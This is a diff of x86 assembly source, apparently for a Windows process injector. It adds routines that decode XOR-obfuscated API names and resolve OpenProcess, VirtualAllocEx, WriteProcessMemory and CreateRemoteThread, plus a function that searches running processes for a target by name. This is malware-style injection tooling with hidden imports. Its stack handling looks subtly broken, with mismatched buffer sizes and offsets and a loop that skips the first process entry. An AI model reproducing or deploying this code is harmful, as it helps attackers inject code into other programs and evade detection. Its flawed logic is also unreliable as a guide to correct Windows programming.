@@ -889,8 +889,8 @@ get_proc_address_by_get_proc_addr:
     cmp dword [get_proc_addr], 0    ; is GetProcAddress available ?
     je .shutdown
 
-    push dword [ebp + 8]            ; base addr
     push dword [ebp + 12]           ; proc name
+    push dword [ebp + 8]            ; base addr
     call [get_proc_addr]            ; proc addr
 
     mov [ebp - 4], eax              ; return value
@@ -950,6 +950,251 @@ unxor_and_get_proc_addr:
 
     add esp, 4                                  ; free local variable space
     add esp, 16                                 ; free arg stack
+
+    leave
+    ret
+
+; arg0: kernel base addr        ebp + 8
+populate_kernel_function_ptrs_by_name:
+    push ebp
+    mov ebp, esp
+
+    push dword 1
+    push get_proc_addr_xor.len
+    push get_proc_addr_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_proc_addr], eax                    ; GetProcAddress addr
+
+    push dword 0
+    push dword get_last_error_xor.len
+    push dword get_last_error_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_last_error], eax                   ; GetLastError addr
+
+    push dword 0
+    push dword loadlibrary_xor.len
+    push dword loadlibrary_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [loadlibrary], eax                      ; LoadLibraryA addr
+
+    push dword 0
+    push dword get_current_process_xor.len
+    push dword get_current_process_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_current_process], eax              ; GetCurrentProcess addr
+
+    push dword 0
+    push dword open_process_xor.len
+    push dword open_process_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [open_process], eax                     ; OpenProcess addr
+
+    push dword 0
+    push dword create_file_a_xor.len
+    push dword create_file_a_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [create_file_a], eax                      ; CreateFileA addr
+
+    push dword 0
+    push dword write_file_xor.len
+    push dword write_file_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [write_file], eax                       ; WriteFile addr
+
+    push dword 0
+    push dword virtual_alloc_ex_xor.len
+    push dword virtual_alloc_ex_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_alloc_ex], eax                 ; VirtualAllocEx addr
+
+    push dword 0
+    push dword virtual_free_ex_xor.len
+    push dword virtual_free_ex_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_free_ex], eax                  ; VirtualFreeEx addr
+
+    push dword 0
+    push dword virtual_protect_ex_xor.len
+    push dword virtual_protect_ex_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_protect_ex], eax               ; VirtualProtectEx addr
+
+    push dword 0
+    push dword read_process_memory_xor.len
+    push dword read_process_memory_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [read_process_memory], eax              ; ReadProcessMemory addr
+
+    push dword 0
+    push dword write_process_memory_xor.len
+    push dword write_process_memory_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [write_process_memory], eax             ; WriteProcessMemory addr
+
+    push dword 0
+    push dword create_remote_thread_xor.len
+    push dword create_remote_thread_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [create_remote_thread], eax             ; CreateRemoteThread addr
+     
+    push dword 0
+    push dword wait_for_single_object_xor.len
+    push dword wait_for_single_object_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [wait_for_single_object], eax           ; WaitForSingleObject addr
+ 
+    push dword 0
+    push dword close_handle_xor.len
+    push dword close_handle_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [close_handle], eax                     ; CloseHandle addr
+
+    push dword 0
+    push dword create_toolhelp32_snapshot_xor.len
+    push dword create_toolhelp32_snapshot_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [create_toolhelp32_snapshot], eax       ; CreateToolhelp32Snapshot addr
+
+    push dword 0
+    push dword process32_first_xor.len
+    push dword process32_first_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [process32_first], eax                  ; Process32First addr
+
+    push dword 0
+    push dword process32_next_xor.len
+    push dword process32_next_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [process32_next], eax                   ;  Process32Next addr
+
+    push dword 0
+    push dword sleep_xor.len
+    push dword sleep_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [sleep], eax                            ; Sleep addr
+
+    push dword 0
+    push dword output_debug_string_a_xor.len
+    push dword output_debug_string_a_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [output_debug_string_a], eax            ; OutputDebugStringA addr
+
+.shutdown:
+    add esp, 4                                  ; free arg stack
+
+    leave
+    ret
+
+
+; arg0: proc name       ebp + 8
+; arg1: proc name len   ebp + 12
+;
+; ret: proc id          eax
+find_target_process_id:
+    push ebp
+    mov ebp, esp
+
+    ; ebp - 4 = return value
+    ; ebp - 8 = snapshot handle
+    ; ebp - 296 = process entry struct
+    sub esp, 296                                ; allocate locate variable space
+
+    mov dword [ebp - 4], 0                      ; return value
+
+    push 0
+    push TH32CS_SNAPPROCESS
+    call [create_toolhelp32_snapshot]           ; snapshot handle
+
+    cmp eax, INVALID_HANDLE_VALUE
+    je .shutdown
+
+    mov [ebp - 8], eax                          ; snapshot handle
+    mov dword [ebp - 580], 564                  ; processentry32.dwsize
+
+    mov eax, ebp
+    sub eax, 580                                ; &processentry
+    push eax
+    push dword [ebp - 8]                              ; snapshot handle 
+    call [process32_first]
+
+    cmp eax, 0                                  ; if !process32First
+    je .shutdown
+
+.loop:
+    mov eax, ebp
+    sub eax, 296                                ; &processentry
+    push eax
+    push dword [ebp - 8]                              ; snapshot handle 
+    call [process32_next]
+
+    cmp eax, 0
+    je .loop_end
+        push dword [ebp + 12]                   ; proc name len
+        mov eax, ebp
+        sub eax, 296                            ; processEntry32
+        add eax, 36                             ; processEntry32.szExeFile
+        push eax
+        push dword [ebp + 8]                    ; proc name
+        call strcmpiAA
+
+        cmp eax, 1                              ; are strings equal
+        je .process_found
+
+        jmp .loop
+
+.process_found:
+    mov eax, ebp
+    sub eax, 296                                ; *processentry32
+    add eax, 8                                  ; processentry32->procID
+
+    mov eax, [eax]
+    mov [ebp - 4], eax
+
+.loop_end:
+
+.shutdown:
+    add esp, 580                                ; free local variable space
+    add esp, 8                                  ; free arg stack
 
     leave
     ret
